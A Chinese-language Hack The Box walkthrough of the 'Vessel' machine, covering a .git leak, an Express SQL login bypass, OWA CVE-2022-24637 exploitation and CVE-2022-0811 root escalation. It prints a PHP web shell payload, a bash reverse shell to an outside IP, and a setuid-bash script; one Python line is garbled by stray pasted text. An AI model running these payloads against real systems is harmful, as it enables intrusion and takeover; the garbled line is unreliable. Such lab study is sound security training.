---
title: 'HTB:Vessel'
date: 2023-04-02 20:54:57
tags: []
published: true
hideInList: false
feature: 
isTop: false
---
# HTB：Vessel

关键词： .git,git information leak,express mis-handles,owa 1.7.3, CVE-2022-24637,PyInstaller generated executable file,pdfcrack

## Base Recon

rustscan端口扫描结果

```python
Open 10.10.11.178:53
Open 10.10.11.178:22
```

用wfuzz/gobuster目录遍历（手动把一些大小写不同的重复的目录删了）

```python
000000009:   200        70 L     182 W      4213 Ch     "login"                                                                                   
000000025:   200        89 L     234 W      5830 Ch     "register"                                                                               
000000122:   200        51 L     125 W      2393 Ch     "404"                                                                                    
000000237:   301        10 L     16 W       173 Ch      "dev"                                           
000000400:   200        243 L    871 W      15030 Ch    "."                                             
000000586:   200        51 L     117 W      2335 Ch     "500"                                           
000000712:   200        89 L     234 W      5830 Ch     "Register"                                      
000000945:   200        52 L     120 W      2400 Ch     "401"                                           
000001688:   200        63 L     177 W      3637 Ch     "reset"
000004658:   403        9 L      28 W       277 Ch      "server-status"
```

子域名wfuzz貌似没什么结果（挠头.jpg)

用Wappalyzer分析的技术框架 如图

![20230402](https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402.png)

以及用burpsuite的find comment查找注释

## .Git

这个时候思路卡住了，看0xdf大佬的笔记发现是需要看 `.git`  ,这里可以记个笔记，除了常见得端口，子域名/目录遍历，功能点人工测试（包括api）,查找注释，技术框架历史漏洞exploit外，还可以看 `.git` ，之前在刷Pentesterlab，Blue专题得时候也刷到过（**Git Information Leak II）**

### 手工提取

如果网站设置禁止访问 `.git` ,那么可以访问

- .git/config
- .git/HEAD

这里的对应目录是 `/dev/.git/config`  和  `/dev/.git/HEAD`   

```python
Request : GET /dev/.git/HEAD
Response :ref: refs/heads/master

Request: GET /dev/.git/config
Response: 
				[core]
					repositoryformatversion = 0
					filemode = true
					bare = false
					logallrefupdates = true
				[user]
					name = Ethan
					email = ethan@vessel.htb
				
```

知道head后，将HEAD换成对应的 `refs/heads/master` 得到hash： 

```python
208167e785aae5b052a4a2f9843d74e733fbd917
```

根据所得到的hash访问:  `.git/objects/{{hash-前两个字母}}/{{hash后半部分}}` ,这里就是 `/dev/.git/objects/20/8167e785aae5b052a4a2f9843d74e733fbd917`  

wget对应的文件，然后用file判断文件类型（一般是zlib）

![20230402](https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%201.png)

获取zlib的内容

```python
printf "\x1f\x8b\x08\x00\x00\x00\x00\x00" |cat - 8167e785aae5b052a4a2f9843d74e733fbd917  | gzip -cd -q
```

![20230402](https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%202.png)

得到邮箱 `ethan@vessel.htb` 

同时还得到新的hash

```python
6ab71e25904c53073631f4f613f88d762cc4a0e3
edb18f3e0cd9ee39769ff3951eeb799dd1d8517e
```

同样的方法，分别访问

```python
http://10.10.11.178/dev/.git/objects/6a/b71e25904c53073631f4f613f88d762cc4a0e3
http://10.10.11.178/dev/.git/objects/ed/b18f3e0cd9ee39769ff3951eeb799dd1d8517e
```

### 使用工具

因为这样的方式很繁琐，并且需要重复，工具的话一般有 

- git-money
- GitTools
- DVCS-Pillage
- git-dumper

这里用git-dumper （ `pipx install git-dumper`  pipx是基于pip的可以安装包到隔离环境里，且减少依赖冲突的一种包管理工具)

使用git-dumper

```python
git-dumper http://10.10.11.178/dev git
```

提取完成后有以下目录

![20230402](https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%203.png)

### 分析git提交记录/代码

查看历史commits

```python
~ git log --oneline                                                                        (exploit) 0 [17:36:28]
208167e (HEAD -> master) Potential security fixes
edb18f3 Security Fixes
f1369cf Initial commit
```

查看security fixes是什么内容

```python
git diff f1369cf edb18f3
```

![20230402](https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%204.png)

另外两条

![20230402](https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%205.png)

查看对应的db代码，看无password什么的

![20230402](https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%206.png)

（这里有 `daqvACHKvRn84VdVp`）

## Bypass Login

> Query escape functions like above are meant to fill replace the `?`
 with the strings and not allow any code there such as open/close quotes or equals signs. However, Express mis-handles how different object types are passed into these function.
> 

### express mis-handles

这里看到代码虽然用了 `?` 来防止sql注入，

```python
connection.query('SELECT * FROM accounts WHERE username = ? AND password = ?', [username, password], function(error, results, fields) {
```

但是expres有一些特性会破坏原本的sql语句，例如

```python
{
    "username": "admin",
    "password": {
        "password": 1,
    }
}
```

就会变成

```python
SELECT * FROM accounts WHERE username = 'admin' AND password = `password` = 1;
```

按照这个思路发起请求（这里如果不是 `application/json` 而是 `application/x-www-form-urlencoded` 其实也可以，用password[password]=1 就可以

![20230402](https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%207.png)

最后进入管理员面板（好耶）

![20230402](https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%208.png)

点击如图的Analytics功能发现会进入 [`http://openwebanalytics.vessel.htb/`](http://openwebanalytics.vessel.htb/) 里，添加到 `/ect/hosts` 里

![20230402](https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%209.png)

![20230402](https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%2010.png)

## Open Web Analytics

只有找会密码。试了刚刚git泄漏的用户 `ethan@vessel.htb` 没有什么结果（提示Error，没有对应邮箱），看index.php会处理两个参数,分别是 `owa_do`和 `owa_go` ，分别代表着当前操作和跳转

![20230402](https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%2011.png)

在源代码中看出当前version的版本是 1.7.3

![20230402](https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%2012.png)

搜索关键词+exploit发现有漏洞 `CVE-2022-24637`  （参考文章：[https://devel0pment.de/?p=2494](https://devel0pment.de/?p=2494)）

### 缓存机制的利用

漏洞的关键是存在一个缓存机制，并且缓存自动将base64编码后得comments和header，footer拼接，并放在了单引号里。在单双引号escape sequences存在巨大的区别（截图来自刚刚那篇文章）：

![20230402](https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%2013.png)

单引号不会转义特殊字符，例如 `\n` ，这样就可以破坏php代码的格式，从而不按照php代码解析导致信息泄漏。而owa（open web analytics）的缓存机制是在目录 **`/owa-data/caches/`** 下，即使用户没登录，也可以伪造登录创造缓存。刚刚试过了用户 `ethan@vessel.htb`  这次将用户名换为admin，创造缓存，然后访问对应cache目录，然而当我们访问目录时，

![20230402](https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%2014.png)

却是空白。

> However, immediately after a failed login, it returns an empty page. The cache seems to clear this directory periodically.
> 

看起来这个方法行不通。但是在那篇讲解 `CVE-2022-24637`  的文章里还提到了，文件名是可预测的。我们从这个点出发，尝试探索（这里偷了个懒，我没有去下载历史版本，本地进行代码分析，而是选择阅读0xdf的文章+github的历史版本仓库链接进行代码分析）。阅读[源代码](https://github.com/Open-Web-Analytics/Open-Web-Analytics/blob/release-1.7.3/modules/base/classes/fileCache.php#L141-L148)可以看到文件名是由变量 `$collection_dir` 拼接而成的

```php
function putItemToCacheStore($collection, $id) {
....
$collection_dir = $this->makeCollectionDirPath($collection);
$cache_file = $collection_dir.$id.'.php';
....
}
```

这里 `putItemToCacheStore` 函数被 `cache.php` 内的 `persistCache` 而调用。cache_file由两个变量组成

- `$collection_dir`
- `$id`

然后看函数  `$this->makeCollectionDirPath` 这里看到

- `$collection_dir` 为  `owa-data/caches`
- `cache_id` 为 `1`
- `$collection` 为目录，例如 `owa_user`, `owa_site`
,

```php
function makeCollectionDirPath($collection) {

        if (!in_array($collection, $this->global_collections)) {
            return $this->cache_dir.$this->cache_id.'/'.$collection.'/';

        } else {
            return $this->cache_dir.$collection.'/';
// owa-data/caches/1
        }
    }
```

查看调用 `putItemToCacheStore` 的函数 `persistCache` 关于 `$id` 的定义

![20230402](https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%2015.png)

而 `$this->dirty_objs` 在函数 `set` （cache.php） 里被定义

```php
$hkey = $this->hash($key); // 计算md5
$this->dirty_objs[$collection][$hkey] = $hkey;
```

调用函数set的函数代码

```php
function addToCache($col = 'id') {
        
        if($this->isCachable()) {
            $cache = owa_coreAPI::cacheSingleton();
            $cache->setCollectionExpirationPeriod($this->getTableName(), $this->getCacheExpirationPeriod());
            $cache->set($this->getTableName(), $col.$this->get('id'), $this, $this->getCacheExpirationPeriod());
        }
    }
```

调用addToCache的函数

```php
function getByColumn($col, $value) {
...[snip]...
        } else {
        
            $db = owa_coreAPI::dbSingleton();
            $db->selectFrom($this->getTableName());
            $db->selectColumn('*');
            owa_coreAPI::debug("Col: $col, value: $value");    
            $db->where($col, $value);
            $properties = $db->getOneRow();
            
            if (!empty($properties)) {
                
                $this->setProperties($properties);
                $this->wasPersisted = true;
                // add to cache            
                $this->addToCache($col);
                owa_coreAPI::debug('entity loaded from db');        
            }
```

有多处调用该函数，但是有一处是用户操作有关，给定了 `user_id`：

```php
function getUser() {

        // fetch user object from the db
        $this->u = owa_coreAPI::entityFactory('base.user');
        $this->u->getByColumn('user_id', $this->credentials['user_id']);
    }
```

所以例如GetUser对应得是 `user_id1`  （转为md5 ： `c30da9265ba0a4704db9229f864c9eb7` ）

然后根据以上分析的，访问 cache_file

```php
http://openwebanalytics.vessel.htb/owa-data/caches/1/owa_user/c30da9265ba0a4704db9229f864c9eb7.php
```

![20230402](https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%2016.png)

base64 decode

```php
O:8:"owa_user":5:{s:4:"name";s:9:"base.user";s:10:"properties";a:10:{s:2:"id";O:12:"owa_dbColumn":11:{s:4:"name";N;s:5:"value";s:1:"1";s:9:"data_type";s:6:"SERIAL";s:11:"foreign_key";N;s:14:"is_primary_key";b:0;s:14:"auto_increment";b:0;s:9:"is_unique";b:0;s:11:"is_not_null";b:0;s:5:"label";N;s:5:"index";N;s:13:"default_value";N;}s:7:"user_id";O:12:"owa_dbColumn":11:{s:4:"name";N;s:5:"value";s:5:"admin";s:9:"data_type";s:12:"VARCHAR(255)";s:11:"foreign_key";N;s:14:"is_primary_key";b:1;s:14:"auto_increment";b:0;s:9:"is_unique";b:0;s:11:"is_not_null";b:0;s:5:"label";N;s:5:"index";N;s:13:"default_value";N;}s:8:"password";O:12:"owa_dbColumn":11:{s:4:"name";N;s:5:"value";s:60:"$2y$10$yjH5xlwtXG9VoB66ridzt.x9iL9jvBfeHByOXtmUQqDU9an7hyscy";s:9:"data_type";s:12:"VARCHAR(255)";s:11:"foreign_key";N;s:14:"is_primary_key";b:0;s:14:"auto_increment";b:0;s:9:"is_unique";b:0;s:11:"is_not_null";b:0;s:5:"label";N;s:5:"index";N;s:13:"default_value";N;}s:4:"role";O:12:"owa_dbColumn":11:{s:4:"name";N;s:5:"value";s:5:"admin";s:9:"data_type";s:12:"VARCHAR(255)";s:11:"foreign_key";N;s:14:"is_primary_key";b:0;s:14:"auto_increment";b:0;s:9:"is_unique";b:0;s:11:"is_not_null";b:0;s:5:"label";N;s:5:"index";N;s:13:"default_value";N;}s:9:"real_name";O:12:"owa_dbColumn":11:{s:4:"name";N;s:5:"value";s:13:"default admin";s:9:"data_type";s:12:"VARCHAR(255)";s:11:"foreign_key";N;s:14:"is_primary_key";b:0;s:14:"auto_increment";b:0;s:9:"is_unique";b:0;s:11:"is_not_null";b:0;s:5:"label";N;s:5:"index";N;s:13:"default_value";N;}s:13:"email_address";O:12:"owa_dbColumn":11:{s:4:"name";N;s:5:"value";s:16:"admin@vessel.htb";s:9:"data_type";s:12:"VARCHAR(255)";s:11:"foreign_key";N;s:14:"is_primary_key";b:0;s:14:"auto_increment";b:0;s:9:"is_unique";b:0;s:11:"is_not_null";b:0;s:5:"label";N;s:5:"index";N;s:13:"default_value";N;}s:12:"temp_passkey";O:12:"owa_dbColumn":11:{s:4:"name";N;s:5:"value";s:32:"ac9e4437ca5150340fdd0578d70a4211";s:9:"data_type";s:12:"VARCHAR(255)";s:11:"foreign_key";N;s:14:"is_primary_key";b:0;s:14:"auto_increment";b:0;s:9:"is_unique";b:0;s:11:"is_not_null";b:0;s:5:"label";N;s:5:"index";N;s:13:"default_value";N;}s:13:"creation_date";O:12:"owa_dbColumn":11:{s:4:"name";N;s:5:"value";s:10:"1650211659";s:9:"data_type";s:6:"BIGINT";s:11:"foreign_key";N;s:14:"is_primary_key";b:0;s:14:"auto_increment";b:0;s:9:"is_unique";b:0;s:11:"is_not_null";b:0;s:5:"label";N;s:5:"index";N;s:13:"default_value";N;}s:16:"last_update_date";O:12:"owa_dbColumn":11:{s:4:"name";N;s:5:"value";s:10:"1650211659";s:9:"data_type";s:6:"BIGINT";s:11:"foreign_key";N;s:14:"is_primary_key";b:0;s:14:"auto_increment";b:0;s:9:"is_unique";b:0;s:11:"is_not_null";b:0;s:5:"label";N;s:5:"index";N;s:13:"default_value";N;}s:7:"api_key";O:12:"owa_dbColumn":11:{s:4:"name";s:7:"api_key";s:5:"value";s:32:"a390cc0247ecada9a2b8d2338b9ca6d2";s:9:"data_type";s:12:"VARCHAR(255)";s:11:"foreign_key";N;s:14:"is_primary_key";b:0;s:14:"auto_increment";b:0;s:9:"is_unique";b:0;s:11:"is_not_null";b:0;s:5:"label";N;s:5:"index";N;s:13:"default_value";N;}}s:16:"_tableProperties";a:4:{s:5:"alias";s:4:"user";s:4:"name";s:8:"owa_user";s:9:"cacheable";b:1;s:23:"cache_expiration_period";i:604800;}s:12:"wasPersisted";b:1;s:5:"cache";N;}
```

![20230402](https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%2017.png)

## Login & file writer

### login as admin

还是刚刚那篇分析cve的文章

![20230402](https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%2018.png)

提到了可以用action： **`base.usersChangePassword`** 实现登录

相关的源代码 （位于 `owa_usersChangePasswordController` 下）

```php
function action() {
		
		// needed for old style embedded install migration
		if ( $this->getParam('is_embedded') ) {
			
			owa_coreAPI::setSetting('base', 'is_embedded', true);
		}
		
		
        $auth = owa_auth::get_instance();
        $status = $auth->authenticateUserTempPasskey($this->params['k']);

        // log to event queue
        if ($status === true) {
            $ed = owa_coreAPI::getEventDispatch();
            $new_password = array('key' => $this->params['k'], 'password' => $this->params['password'], 'ip' => $_SERVER['REMOTE_ADDR'], 'user_id' => $auth->u->get('user_id'));
            $ed->log($new_password, 'base.set_password');
            $auth->deleteCredentials();
            $this->setRedirectAction('base.loginForm');
            $this->set('status_code', 3006);
        } else {
            $this->setRedirectAction('base.loginForm');
            $this->set('error_code', 2011); // can't find key in the db
        }
    }
```

首先要读取 `$this->params['k']` 然后判定状态status为true，要构造的：

- `$this->params['k']` ： 为刚刚的temp_passkey ac9e4437ca5150340fdd0578d70a4211
- `$this->params['password']` 新得password

```php
owa_user_id=admin&owa_password=qwe123&owa_password2=qwe123&owa_action=base.usersChangePassword&owa_k=36bb6d5b1da9942b1447a1e226d34766
```

![20230402](https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%2019.png)

![20230402](https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%2020.png)

我这里做题太久了，靶场被重置了一下，所以temp_passkey换成最新的了。

### php file write

根据那篇分析cve的[文章](https://devel0pment.de/?p=2494)，点进settings，这里文件上传对应的action是 **`base.optionsUpdate`** 与之对应得Controller是 **`owa_optionsUpdateController`** 

代码分析过程就不复述了，关键部分截图如下

![20230402](https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%2021.png)

[https://www.notion.so](https://www.notion.so)

这里我们可以通过修改对应的 `base.error_log_file`  和 `base.error_log_level` ****来使得攻击者构造得内容写入文件中

我们这里看[http://openwebanalytics.vessel.htb/index.php?owa_do=base.optionsGeneral](http://openwebanalytics.vessel.htb/index.php?owa_do=base.optionsGeneral) 也能看到对应的Log File所在目录

![20230402](https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%2022.png)

创建请求测试，验证访问（发现文件被创建了）：[http://openwebanalytics.vessel.htb/owa-data/logs/neko.php](http://openwebanalytics.vessel.htb/owa-data/logs/neko.php)

```php
POST /index.php?owa_do=base.optionsGeneral HTTP/1.1
Host: openwebanalytics.vessel.htb
Content-Length: 185
Cache-Control: max-age=0
Origin: http://openwebanalytics.vessel.htb
DNT: 1
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://openwebanalytics.vessel.htb/index.php?owa_do=base.optionsGeneral&owa_site_id=&owa_status_code=2500&
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: owa_userSession=admin; owa_passwordSession=bf38e9d85b691942e25d3967408d1fc4fdbd0033b7d409d3f7b3617173e81409
sec-gpc: 1
Connection: close

owa_config%5Bbase.error_log_level%5D=2&owa_config%5Bbase.error_log_file%5D=/var/www/html/owa/owa-data/logs/neko.php&&owa_nonce=81b2a1198d&owa_action=base.optionsUpdate&owa_module=base
```

拿shell(访问 [`http://openwebanalytics.vessel.htb/owa-data/logs/neko.php?cmd=bash -c 'bash -i >%26 /dev/tcp/10.10.14.24/2333 0>%261'`](http://openwebanalytics.vessel.htb/owa-data/logs/neko.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.10.14.24/2333%200%3E%261%27)

```php
owa_config%5Bbase.neko%5D=<%3fphp+system($_REQUEST['cmd'])%3b+%3f>&&&owa_nonce=81b2a1198d&owa_action=base.optionsUpdate&owa_module=base
```

这里测试失败好几次，建议还是intercept拦截，一定要看到前端页面提示修改成功的英文提示，不然直接repeater改会有问题

## User flag

### 连接服务器&探索

本地nc

```php
nc -lnvp 2333
```

构造的请求

```php
http://openwebanalytics.vessel.htb/owa-data/logs/neko.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.10.14.24/2333%200%3E%261%27
```

然后升级shell

![20230402](https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%2023.png)

home目录下只能进入steven

![20230402](https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%2024.png)

查看steven目录下的文件passwordGenerator

```php
www-data@vessel:/home/steven$ file passwordGenerator
file passwordGenerator
passwordGenerator: PE32 executable (console) Intel 80386, for MS Windows
```

除此之外还有隐藏文件夹 `.notes` （通过 `ls -la` 查看到）开一个http服务器获取文件 （也可以用nc传文件）

```php
python3 -m http.server 9000
```

文件1：screenshot.png

![20230402](https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%2025.png)

文件2：notes.pdf

![20230402](https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%2026.png)

看到截图里有关键字Password Generator ，然后想到了刚刚file命令查看的那个文件（顺便也通过http服务器下载到本地了）

### 分析passwordGenerator

本地用strings提取字符串

![20230402](https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%2027.png)

是pyinstaller exe的文件。使用[pyinstxtractor](https://github.com/extremecoders-re/pyinstxtractor)

```php
python pyinstxtractor.py  /tmp/htb/passwordGenerator                                                                                                                                                                                 0 [15:01:23]
[+] Processing /tmp/htb/passwordGenerator
[+] Pyinstaller version: 2.1+
[+] Python version: 3.7
[+] Length of package: 34300131 bytes
[+] Found 95 files in CArchive
[+] Beginning extraction...please standby
[+] Possible entry point: pyiboot01_bootstrap.pyc
[+] Possible entry point: pyi_rth_subprocess.pyc
[+] Possible entry point: pyi_rth_pkgutil.pyc
[+] Possible entry point: pyi_rth_inspect.pyc
[+] Possible entry point: pyi_rth_pyside2.pyc
[+] Possible entry point: passwordGenerator.pyc
[!] Warning: This script is running in a different Python version than the one used to build the executable.
```

php下载  `uncomplye6`并用 uncomplye6 dump代码

```php
~ uncompyle6  passwordGenerator.pyc                                                                                                                                                                                                    (exploit) 0 [15:22:14]

// 关键代码

    def genPassword(self):
        length = value  // 这里是32
        char = index
        if char == 0:
            charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890~!@#$%^&*()_-+={}[]|:;<>,.?'
        else:
            if char == 1:
                charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
            else:
                if char == 2:
                    charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890'
                else:
                    try:
                        qsrand(QTime.currentTime().msec())
                        password = ''
                        for i in range(length):
                            idx = qrand() % len(charset)
                            nchar = charset[idx]
                            password += str(nchar)

                    except:
                        msg = QMessageBox()
                        msg.setWindowTitle('Error')
                        msg.setText('Error while generating password!, Send a message to the Author!')
                        x = msg.exec_()

                return password

```

### Crack Password

刚刚图片的password length是32位，这里length为32，all characters意味着char==0

 结合已知py脚本，生成特定条件下的密码字典

```python
from PySide2.QtCore import *
length = 32 
charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890~!@#$%^&*()_-+={}[]|:;<>,.?'
for i in range(0, 999):
    qsrand(i)
    password = ''
    for i in range(length):
        idx = qrand() % len(charset)
        nchar = charset[idx]192.168.3.34：8000192192192
        password += str(nchar)
    print(password)
```

使用 `pdfcrack` 将上述输出作为wordlist破解对应pdf。这里有点坑的是，windows下生成的密码字典和linux下生成的会有差异。最后密码是

```python
YG7Q7RDzA+q&ke~MJ8!yRzoI^VQxSqSS
```

![20230402](https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%2028.png)

### ethan’s flag

用su切换到ethan或者ssh链接，密码是pdf里面的。成功拿下user flag

```python
b@mPRNSVTjjLKId1T
```

## root flag

1. 先用 `sudo -l` 查看ethan有什么权限，发现没有线索。
2. 用 `find` 命令查看用户/用户组所属的目录

```diff
find / -user ethan 2>/dev/null | grep -Ev '^/(run|sys|proc|home)'
find / -group ethan 2>/dev/null | grep -Ev '^/(run|sys|proc|home)'
```

![20230402](https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%2029.png)

### pinns

`md5sum` 的结果去virustotal上查无果，用 `-h` 也无果。 用google dork的方法去搜索，语法：

```diff
"/pinns" namespaces  github
```

![20230402](https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%2030.png)

但是输入相关得参数却不是

![20230402](https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%2031.png)

带exploit关键词搜，会搜到这篇[文章](https://www.crowdstrike.com/blog/cr8escape-new-vulnerability-discovered-in-cri-o-container-engine-cve-2022-0811/)，得知是CVE-2022-0811

![20230402](https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%2032.png)

确认版本号：

![20230402](https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%2033.png)

### CVE-2022-0811

即使有大佬博客的学习，但持续性的啃hard的box，我差点啃不下去了……

不过该看还是得看。

> 0xdf：It is a vulnerability in the CRI-O container engine, an open source container engine which can replace Docker in Kubernetes implementation such as OpenShift.
> 

产生漏洞的原因是在 `version 1.19` 里盲目的添加了 sysctl的支持，而没有做内核参数绑定校验（如图，刚那篇文章里的）

![20230402](https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%2034.png)

参考：[https://docs.kernel.org/admin-guide/sysctl/](https://docs.kernel.org/admin-guide/sysctl/)  这里我们要想办法利用该漏洞滥用sysctl的特性拿到root access

![20230402](https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%2035.png)

这里设置

- `kernel.shm_rmid_forced=1`
- `kernel.core_pattern=|[script] #`

之所以是 `|` 开头看文档描述：

```diff
If the first character of the pattern is a ‘|’, the kernel will treat the rest of the pattern as a command to run. The core dump will be written to the standard input of that program instead of to a file.
```

首先在exploit前先确认原始的参数值

![20230402](https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%2036.png)

运行命令

```diff
pinns -s 'kernel.shm_rmid_forced=1'+'kernel.core_pattern=|/tmp/exp.sh #' -f filename -d /dev/shm -U
```

同样检查是否更改对应值。发现成功了

```diff
ethan@vessel:/dev/shm$ cat /proc/sys/kernel/core_pattern /proc/sys/kernel/shm_rmid_forced
|/tmp/exp.sh #
1
```

在 `exp.sh` 下写入如下内容，并用 `chmod` 赋予对应权限（ `+x` )

```diff
#!/bin/bash

cp /bin/bash /tmp/htb
chown root:root /tmp/htb
chmod 4755 /tmp/htb
```

这个脚本是创建了一份bash得拷贝，并设置了对应的权限。同时我们的内核变量  `/proc/sys/kernel/core_pattern``  也已经指向到了该脚本

然后

```diff
cp exp.sh .w  /dev/shm
```

执行

```diff
sleep 100&
killall -s SIGSEGV sleep
```

![20230402](https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%2037.png)

拿到root的flag

## 结语

虽然前面是express的mis-handle但是后续关于owa的历史版本1.7.3包含了大量的php代码审计部分，如果想训练代码审计结合实战是不错得选择。只是对我这种菜鸟代码量太多了，所以选择偷懒得方式直接看别人分析好的代码文章而不是clone历史漏洞版本。但，如果后续想要去尝试漏洞挖掘的时候回过头再过一遍这个分析的过程也是不错得选择。

老实说那个passwordgenerator有点坑……hard的box确实很难（叹气） 继续练习，不要放弃。

## Reference

- [https://0xdf.gitlab.io/2023/03/25/htb-vessel.html](https://0xdf.gitlab.io/2023/03/25/htb-vessel.html)
- [https://pentesterlab.com/](https://pentesterlab.com/)
- [https://devel0pment.de/?p=2494](https://devel0pment.de/?p=2494)
- [https://docs.kernel.org/admin-guide/sysctl/](https://docs.kernel.org/admin-guide/sysctl/)